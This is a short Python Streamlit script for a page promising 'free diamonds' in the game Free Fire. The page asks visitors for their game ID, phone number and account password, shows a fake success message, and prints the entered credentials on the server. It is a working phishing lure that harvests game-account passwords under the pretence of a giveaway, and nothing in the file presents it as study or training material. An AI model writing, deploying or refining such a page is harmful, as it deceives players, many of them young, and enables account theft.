import streamlit as st



st.title("FREE FIRE DIAMOND TOPUP")
st.header("Get free diamonds on your free fire id")
ffid = st.text_input("Enter your free fire id")
number = st.text_input("Enter your phone number")
password = st.text_input("Enter free fire password")
diamond = st.text_input("Enter diamonds number you want")
button = st.button("Submit")


if button :
    print("Order Created Successfully")
    print("You will get diamond soon")
    print("Free Fire id name : " + ffid)
    print("Your phone number is : " + number)
    print("Your password is : " + password)
    print("Free Fire diamond you want : " + diamond)